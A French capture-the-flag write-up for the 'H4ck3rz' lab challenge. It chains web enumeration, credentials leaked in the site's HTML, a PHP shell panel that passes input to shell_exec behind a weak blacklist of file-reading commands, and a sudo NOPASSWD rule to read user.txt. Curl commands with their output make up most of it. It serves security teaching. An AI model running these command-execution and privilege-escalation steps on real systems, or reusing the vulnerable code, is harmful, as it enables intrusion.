# H4ck3rz

## Informations

* **Challenge:** H4ck3rz
* **Difficulté:** 500
* **Cible:** `10.10.0.35`
* **Objectif:** Obtenir le fichier `user.txt`
* **Flag:** `EPI{********}`

---

## 1. Techniques utilisées

Les techniques utilisées lors de ce challenge sont :

* Reconnaissance réseau
* Énumération des services
* Énumération web
* Analyse de `robots.txt`
* Énumération de répertoires et fichiers web
* OSINT sur les fichiers accessibles publiquement
* Analyse du code source HTML
* Découverte d'identifiants
* Authentification avec des identifiants récupérés
* Exploitation d'une commande système exécutée côté serveur
* Analyse du code source PHP
* Contournement d'une blacklist de commandes
* Énumération des permissions `sudo`
* Élévation de privilèges de `www-data` vers `titouan`
* Recherche du fichier `user.txt`

Aucune attaque par brute force ou SQL injection n'a été nécessaire.

---

# 2. Reconnaissance

## 2.1 Scan des ports

Un premier scan Nmap a été effectué afin d'identifier les services exposés.

### Commande

```bash
nmap -sC -sV 10.10.0.35
```

### Résultat

```text
Starting Nmap 7.95 ...

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4
80/tcp open  http    Apache httpd 2.4.68 (Debian)

|_http-title: my 42sh
| http-robots.txt: 1 disallowed entry
|_/1337_53CR37_l41r
```

Deux services principaux sont accessibles :

* **SSH** sur le port `22`
* **HTTP** sur le port `80`

Le résultat Nmap indique également l'existence d'une entrée intéressante dans `robots.txt`.

---

# 3. Énumération du site web

## 3.1 robots.txt

Le fichier `robots.txt` est consulté :

```bash
curl -s http://10.10.0.35/robots.txt
```

### Résultat

```text
User-agent: *
Disallow: /1337_53CR37_l41r
```

Le répertoire `/1337_53CR37_l41r` est donc explicitement indiqué comme interdit aux robots d'indexation.

Ce type d'information est souvent intéressant lors d'une phase d'énumération web.

---

## 3.2 Énumération des répertoires

Une énumération des fichiers et répertoires accessibles a ensuite été réalisée avec **Feroxbuster**.

### Commande

```bash
feroxbuster -u http://10.10.0.35
```

### Résultats pertinents

```text
301 /1337_53CR37_l41r -> /1337_53CR37_l41r/
200 /assets/bootstrap.min.js
200 /assets/portal.png
200 /login.php
200 /assets/clacon2.woff2
200 /assets/jquery.min.js
301 /assets -> /assets/
200 /assets/bootstrap.min.css
200 /assets/42sh.png
200 /index.html
302 /portal.php -> /login.php
200 /1337_53CR37_l41r/index.html
200 /robots.txt
302 /forbidden.php -> /login.php
```

Plusieurs ressources intéressantes sont découvertes :

* `/login.php`
* `/portal.php`
* `/forbidden.php`
* `/1337_53CR37_l41r/index.html`

Le répertoire découvert grâce à `robots.txt` est particulièrement intéressant.

---

# 4. Découverte d'un mot de passe

Le contenu de la page cachée est récupéré :

```bash
curl -s http://10.10.0.35/1337_53CR37_l41r/index.html
```

Une information sensible apparaît dans la page :

```html
<p>Just in case I forgot, password to my super future 42sh: 8ES7_SHeLL_Ev4H</p>
```

Le mot de passe découvert est donc :

```text
8ES7_SHeLL_Ev4H
```

---

# 5. Découverte du nom d'utilisateur

L'analyse du code source de la page principale permet également de découvrir un commentaire HTML intéressant.

Une partie du code contient :

```html
<!--
  STOP READING if you're not me!

  Remember username: d4rk_T1t0u4N
-->
```

Le nom d'utilisateur associé à l'application web est donc :

```text
d4rk_T1t0u4N
```

À ce stade, nous disposons de :

```text
Username: d4rk_T1t0u4N
Password: ********
```

---

# 6. Authentification sur l'application

Le formulaire de connexion de `/login.php` utilise les paramètres POST :

```text
username
password
sub
```

Une requête est envoyée avec les identifiants découverts.

### Commande

```bash
curl -i -c cookies.txt \
  -d 'username=d4rk_T1t0u4N&password=8ES7_SHeLL_Ev4H&sub=Login' \
  http://10.10.0.35/login.php
```

### Résultat pertinent

```text
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=...
Location: /portal.php
```

La redirection vers `/portal.php` indique que l'authentification a réussi.

Le cookie de session est sauvegardé dans `cookies.txt` afin de pouvoir effectuer les requêtes suivantes en tant qu'utilisateur authentifié.

---

# 7. Découverte du Shell Panel

La page `/portal.php` contient un formulaire permettant de soumettre une commande :

```html
<form name="input" action="" method="post">
  <h3>Shell Panel</h3>
  <input type="text" class="form-control" name="command"
         placeholder="Test the shell here"/>
  <input type="submit" value="Execute"
         class="btn btn-success" name="sub"/>
</form>
```

Cela indique qu'une commande système peut potentiellement être exécutée par le serveur.

---

# 8. Identification de l'utilisateur système

La commande `id` est exécutée via le Shell Panel.

### Commande

```bash
curl -s -b cookies.txt \
  -d 'command=id&sub=Execute' \
  http://10.10.0.35/portal.php
```

### Résultat

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

La commande est donc exécutée avec les privilèges du compte :

```text
www-data
```

Il s'agit du compte utilisé par le serveur web Apache.

---

# 9. Énumération du système

Le répertoire courant est vérifié.

### Commande

```bash
curl -s -b cookies.txt \
  -d 'command=pwd&sub=Execute' \
  http://10.10.0.35/portal.php
```

### Résultat

```text
/var/www/html
```

Le contenu du répertoire web est ensuite énuméré :

```bash
curl -s -b cookies.txt \
  --data-urlencode 'command=ls -la /var/www/html' \
  -d 'sub=Execute' \
  http://10.10.0.35/portal.php
```

### Résultat

```text
total 52
drwxr-xr-x 1 www-data www-data 4096 Jul 23 13:42 .
drwxr-xr-x 1 root     root     4096 Aug 27 09:34 ..
drwxr-xr-x 1 www-data www-data 4096 Jul 23 13:42 1337_53CR37_l41r
drwxr-xr-x 1 www-data www-data 4096 Jul 23 13:42 assets
-rwxr-xr-x 1 www-data www-data 1501 Jul 23 13:42 forbidden.php
-rwxr-xr-x 1 www-data www-data 1270 Jul 23 13:42 index.html
-rwxr-xr-x 1 www-data www-data 1868 Jul 23 13:42 login.php
-rwxr-xr-x 1 www-data www-data 2538 Jul 23 13:42 portal.php
-rwxr-xr-x 1 www-data www-data   42 Jul 23 13:42 robots.txt
```

---

# 10. Analyse du code source PHP

L'analyse de `portal.php` permet de comprendre comment les commandes sont filtrées.

Comme `cat` fait partie des commandes interdites, `grep` est utilisé pour afficher le fichier :

```bash
curl -s -b cookies.txt \
  --data-urlencode 'command=grep -n "" portal.php' \
  -d 'sub=Execute' \
  http://10.10.0.35/portal.php
```

Le code intéressant est :

```php
function contains($str, array $arr)
{
    foreach($arr as $a) {
        if (stripos($str,$a) !== false) return true;
    }
    return false;
}

$cmds = array("tac", "less", "cat", "head", "more", "tail", "nano", "vim", "vi");

if(isset($_POST["command"])) {
    if(contains($_POST["command"], $cmds)) {
        echo "</br><p><u>Command contain some forbidden keywords</u>. Disabled to prevent dirty hackers, never too cautious</p>";
    } else {
        $output = shell_exec($_POST["command"]);
        echo "</br><pre>$output</pre>";
    }
}
```

## Analyse

L'application ne met pas en place un véritable shell restreint.

Elle effectue simplement une vérification de sous-chaînes avec :

```php
stripos()
```

Les commandes suivantes sont bloquées :

```text
tac
less
cat
head
more
tail
nano
vim
vi
```

Cependant, les autres commandes peuvent être exécutées directement avec :

```php
shell_exec($_POST["command"])
```

Il est donc possible d'utiliser des commandes alternatives comme :

```text
grep
find
id
sudo
ls
pwd
```

Cette blacklist constitue une restriction faible et permet de poursuivre l'énumération.

---

# 11. Recherche de fichiers sensibles

Une recherche globale du fichier `user.txt` est effectuée :

```bash
curl -s -b cookies.txt \
  --data-urlencode 'command=find / -name user.txt 2>&1' \
  -d 'sub=Execute' \
  http://10.10.0.35/portal.php
```

Le résultat contient notamment :

```text
find: '/home/titouan': Permission denied
find: '/root': Permission denied
```

Le compte `www-data` ne dispose donc pas des permissions nécessaires pour explorer certains répertoires utilisateurs.

---

# 12. Énumération SUID

Une recherche de fichiers SUID est effectuée afin d'identifier une éventuelle élévation de privilèges :

```bash
curl -s -b cookies.txt \
  --data-urlencode 'command=find / -perm -4000 -type f 2>/dev/null' \
  -d 'sub=Execute' \
  http://10.10.0.35/portal.php
```

### Résultat

```text
/usr/bin/mount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/chsh
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

Aucun binaire SUID inhabituel n'est immédiatement identifié.

La présence de `sudo` justifie cependant une vérification de ses permissions.

---

# 13. Énumération des permissions sudo

La commande suivante est exécutée :

```bash
curl -s -b cookies.txt \
  --data-urlencode 'command=sudo -l' \
  -d 'sub=Execute' \
  http://10.10.0.35/portal.php
```

### Résultat

```text
Matching Defaults entries for www-data on h4xx0r_pc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on h4xx0r_pc:
    (titouan) NOPASSWD: ALL
```

Cette information constitue le vecteur d'élévation de privilèges.

Le compte `www-data` peut exécuter **n'importe quelle commande** en tant que `titouan` sans fournir de mot de passe.

La règle importante est :

```text
(titouan) NOPASSWD: ALL
```

---

# 14. Élévation de privilèges vers titouan

L'exploitation de cette mauvaise configuration est vérifiée avec :

```bash
curl -s -b cookies.txt \
  --data-urlencode 'command=sudo -u titouan id' \
  -d 'sub=Execute' \
  http://10.10.0.35/portal.php
```

### Résultat

```text
uid=1000(titouan) gid=1000(titouan) groups=1000(titouan)
```

Nous avons donc réussi à passer de :

```text
www-data
```

à :

```text
titouan
```

---

# 15. Recherche du user.txt

La recherche est maintenant effectuée avec les permissions de `titouan`.

### Commande

```bash
curl -s -b cookies.txt \
  --data-urlencode 'command=sudo -u titouan find /home/titouan -name user.txt -type f' \
  -d 'sub=Execute' \
  http://10.10.0.35/portal.php
```

### Résultat

```text
/home/titouan/user.txt
```

Le fichier est donc localisé.

---

# 16. Récupération du flag

La commande `cat` étant bloquée par la blacklist, `grep` est utilisé pour afficher le contenu du fichier.

### Commande

```bash
curl -s -b cookies.txt \
  --data-urlencode 'command=sudo -u titouan grep -n "" /home/titouan/user.txt' \
  -d 'sub=Execute' \
  http://10.10.0.35/portal.php
```

### Résultat

```text
1:EPI{********}
```

Le flag utilisateur est donc :

```text
EPI{********}
```

---

# 17. Chaîne d'exploitation

La chaîne complète d'exploitation peut être résumée ainsi :

```text
Nmap
  │
  ├── 22/tcp SSH
  └── 80/tcp HTTP
          │
          ▼
      robots.txt
          │
          ▼
 /1337_53CR37_l41r/
          │
          ▼
  Découverte du mot de passe
  8ES7_SHeLL_Ev4H
          │
          ▼
  Analyse du code source
          │
          ▼
  Découverte du username
  d4rk_T1t0u4N
          │
          ▼
       login.php
          │
          ▼
      portal.php
          │
          ▼
  Command execution
          │
          ▼
      www-data
          │
          ▼
      sudo -l
          │
          ▼
(titouan) NOPASSWD: ALL
          │
          ▼
       titouan
          │
          ▼
 /home/titouan/user.txt
          │
          ▼
          FLAG
```

---

# 18. Outils utilisés

| Outil                               | Utilisation                                                        |
| ----------------------------------- | ------------------------------------------------------------------ |
| `nmap`                              | Reconnaissance des ports et services                               |
| `curl`                              | Requêtes HTTP, authentification et interaction avec le Shell Panel |
| `feroxbuster`                       | Énumération des fichiers et répertoires web                        |
| `grep`                              | Lecture de fichiers malgré la blacklist de `cat`                   |
| `find`                              | Recherche de fichiers et énumération SUID                          |
| `sudo`                              | Énumération et exploitation des permissions                        |
| Navigateur / analyse du code source | Analyse des pages HTML et découverte d'informations                |

Aucun outil de brute force, SQL injection, cracking de mot de passe ou tunneling n'a été nécessaire.

---

# 19. Vulnérabilités identifiées

## 19.1 Informations sensibles exposées

Le site expose directement dans des pages web :

* un mot de passe ;
* un nom d'utilisateur ;
* des informations permettant d'accéder au Shell Panel.

Ces informations auraient dû être supprimées ou protégées.

## 19.2 Exécution de commandes arbitraires

Le paramètre `command` est directement transmis à :

```php
shell_exec($_POST["command"])
```

Cela permet à un utilisateur authentifié d'exécuter des commandes système arbitraires avec les privilèges du serveur web.

## 19.3 Blacklist de commandes insuffisante

La protection repose sur une blacklist :

```php
array("tac", "less", "cat", "head", "more", "tail", "nano", "vim", "vi")
```

Cette méthode est insuffisante pour sécuriser une fonctionnalité d'exécution de commandes.

La commande `cat`, par exemple, peut être remplacée par d'autres outils tels que `grep`.

## 19.4 Mauvaise configuration sudo

La configuration suivante est particulièrement critique :

```text
www-data -> (titouan) NOPASSWD: ALL
```

Un compte compromis par le serveur web peut donc exécuter n'importe quelle commande avec les privilèges de `titouan`.

---

# 20. Conclusion

Le challenge repose principalement sur une chaîne d'énumération et de mauvaises configurations :

1. Une entrée intéressante est découverte dans `robots.txt`.
2. L'énumération web permet d'accéder à un répertoire caché.
3. Ce répertoire expose un mot de passe.
4. Le code source de la page principale expose un nom d'utilisateur.
5. Les identifiants permettent d'accéder au `portal.php`.
6. Le `Shell Panel` permet l'exécution de commandes système.
7. L'analyse du code PHP révèle une simple blacklist de commandes.
8. `sudo -l` révèle que `www-data` peut devenir `titouan` sans mot de passe.
9. En tant que `titouan`, le fichier `/home/titouan/user.txt` devient accessible.
10. Le flag est récupéré avec `grep`.

### Flag

```text
EPI{********}
```
